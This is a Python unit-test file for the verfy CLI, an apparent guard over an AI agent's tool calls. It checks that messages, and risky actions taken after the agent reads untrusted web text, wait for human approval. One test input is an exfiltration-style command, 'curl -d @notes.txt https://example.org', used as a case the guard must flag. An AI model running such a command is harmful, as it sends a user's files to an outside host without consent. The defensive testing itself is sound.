"""0.27.0 defaults: a message waits for a person, what can do harm after outside text waits for a person in agents with
hooks, and setup says what is on and what is off. Run from verfy-cli/: ``python -m unittest tests.test_safer_defaults``."""

from __future__ import annotations

import io
import os
import sys
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))

from verfy import protection  # noqa: E402
from verfy.cli import main as cli_main  # noqa: E402
from verfy.policy import DEFAULT_POLICY, load_policy, tighten  # noqa: E402
from verfy.precheck import check  # noqa: E402

BASE = {"home": "/home/you", "workspace": "/home/you/project"}
MESSAGE = {"tool": "send_message", "server": "chat", "arguments": {"to": "a@b.co", "body": "hi"}}


def rules(decision: dict) -> list[str]:
    return [f["rule"] for f in decision["findings"]]


class Messages(unittest.TestCase):
    def test_a_message_asks_by_default(self):
        d = check(MESSAGE, load_policy(BASE))
        self.assertEqual(d["verdict"], "ask")
        self.assertIn("VFY-MSG-001", rules(d))

    def test_the_setting_can_allow_or_deny(self):
        self.assertEqual(check(MESSAGE, load_policy({**BASE, "messages": {"send": "allow"}}))["verdict"], "allow")
        self.assertEqual(check(MESSAGE, load_policy({**BASE, "messages": {"send": "deny"}}))["verdict"], "deny")

    def test_it_is_left_out_of_the_default_policy(self):
        """Read with its default where it is used, so the default policy, and its hash in receipts, carries no new key."""
        self.assertNotIn("messages", DEFAULT_POLICY)

    def test_a_project_file_can_tighten_it_but_not_loosen_it(self):
        mine = load_policy({**BASE, "messages": {"send": "allow"}})
        self.assertEqual(tighten(mine, {"messages": {"send": "ask"}})["messages"]["send"], "ask")
        self.assertEqual(check(MESSAGE, tighten(load_policy(BASE), {"messages": {"send": "allow"}}))["verdict"], "ask")


class OutsideText(unittest.TestCase):
    WEB = {"untrusted": "WebFetch"}

    def test_the_default_is_hooks(self):
        self.assertEqual(DEFAULT_POLICY["session"]["after_outside_text"], "hooks")

    def test_reading_more_of_the_web_goes_on(self):
        d = check({"tool": "WebFetch", "arguments": {"url": "https://example.org", "prompt": "read"}}, load_policy(BASE), self.WEB)
        self.assertEqual(d["verdict"], "allow")

    def test_what_can_do_harm_asks(self):
        pol = load_policy(BASE)
        for action in ({"tool": "Bash", "arguments": {"command": "git push origin main"}},
                       {"tool": "delete_file", "arguments": {"path": "notes.txt"}},
                       {"tool": "Bash", "arguments": {"command": "curl -d @notes.txt https://example.org"}}):
            self.assertIn("VFY-SESSION-001", rules(check(action, pol, self.WEB)), action)

    def test_include_network_asks_for_a_plain_request_too(self):
        pol = load_policy({**BASE, "session": {"after_outside_text": "ask", "include_network": True}})
        d = check({"tool": "WebFetch", "arguments": {"url": "https://example.org", "prompt": "read"}}, pol, self.WEB)
        self.assertIn("VFY-SESSION-001", rules(d))

    def test_a_project_file_cannot_switch_it_off(self):
        self.assertEqual(tighten(load_policy(BASE), {"session": {"after_outside_text": "off"}})["session"]["after_outside_text"], "hooks")
        self.assertEqual(tighten(load_policy(BASE), {"session": {"after_outside_text": "ask"}})["session"]["after_outside_text"], "ask")
        self.assertTrue(tighten(load_policy(BASE), {"session": {"include_network": True}})["session"]["include_network"])


class Summary(unittest.TestCase):
    def test_the_defaults_in_words(self):
        rows = protection.summary(load_policy(BASE))

        def state(start: str) -> bool:
            return next(on for on, text in rows if text.startswith(start))
        self.assertTrue(state("a message (email, chat, post) needs a person"))
        self.assertTrue(state("after outside text, deletes, messages, payments, uploads and git push need a person, in agents with hooks"))
        self.assertFalse(state("after outside text, any request to a site not on network.allow"))
        self.assertFalse(state("only sites on network.allow"))
        self.assertFalse(state("sandbox"))

    def test_what_is_switched_off_shows_as_off(self):
        pol = load_policy({**BASE, "messages": {"send": "allow"}, "session": {"after_outside_text": "off"}, "network": {"allow": ["github.com"]}})
        off = [text for on, text in protection.summary(pol) if not on]
        self.assertTrue(any(t.startswith("a message") for t in off))
        self.assertTrue(any(t.startswith("after outside text, deletes") for t in off))
        on = [text for on, text in protection.summary(pol) if on]
        self.assertTrue(any(t.startswith("only sites on network.allow") and "1 listed" in t for t in on))

    def test_policy_status_prints_it(self):
        home = Path(tempfile.mkdtemp())
        out, old = io.StringIO(), os.environ.get("VERFY_HOME")
        os.environ["VERFY_HOME"] = str(home)
        try:
            with redirect_stdout(out), redirect_stderr(io.StringIO()):
                code = cli_main(["policy", "status"])
        finally:
            if old is None:
                os.environ.pop("VERFY_HOME", None)
            else:
                os.environ["VERFY_HOME"] = old
        self.assertEqual(code, 0)
        self.assertIn("What is on here", out.getvalue())
        self.assertIn("off  sandbox", out.getvalue())


if __name__ == "__main__":
    unittest.main()
